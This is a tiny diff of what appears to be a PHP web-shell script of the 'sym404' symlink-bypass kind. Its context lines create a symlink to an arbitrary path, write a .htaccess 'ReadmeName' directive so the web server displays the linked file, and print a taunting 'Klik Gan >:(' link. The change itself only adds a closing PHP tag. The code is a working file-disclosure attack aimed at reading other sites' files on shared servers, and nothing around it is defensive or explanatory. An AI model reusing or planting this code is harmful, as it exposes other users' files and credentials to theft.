@@ -17,4 +17,4 @@ symlink($dir,"sym404/".$jnck);
 $inija = fopen("sym404/.htaccess", "w");
 fwrite($inija,"ReadmeName ".$jnck);
 echo'<a href="sym404/">Klik Gan >:(</a>';
-}
+}?>
